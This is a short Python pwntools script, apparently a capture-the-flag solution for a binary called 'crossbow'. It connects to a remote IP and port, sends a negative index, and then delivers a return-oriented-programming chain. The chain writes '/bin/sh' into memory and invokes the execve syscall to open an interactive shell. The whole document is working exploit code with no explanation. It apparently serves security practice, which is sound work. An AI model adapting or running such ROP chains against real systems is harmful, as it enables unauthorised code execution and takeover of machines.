from pwn import *

elf = ELF("./crossbow_patched")

context.binary = elf

# p = process()
# gdb.attach(p)
p = remote("94.237.55.186", 57661)

p.sendlineafter(b': ', b'-2')
pop_rdi = 0x0000000000401d6c
mov_rdi_rax = 0x00000000004020f5
pop_rax = 0x0000000000401001
pop_rsi = 0x000000000040566b
pop_rdx = 0x0000000000401139
p.sendlineafter(b'> ', b'a' * 8 + pack(pop_rax) + b'/bin/sh\x00' + pack(pop_rdi) + pack(0x40d000) + pack(mov_rdi_rax) + pack(pop_rax) + pack(59) + pack(pop_rsi) + pack(0) + pack(pop_rdx) + pack(0) + pack(0x0000000000404b51))
p.interactive()
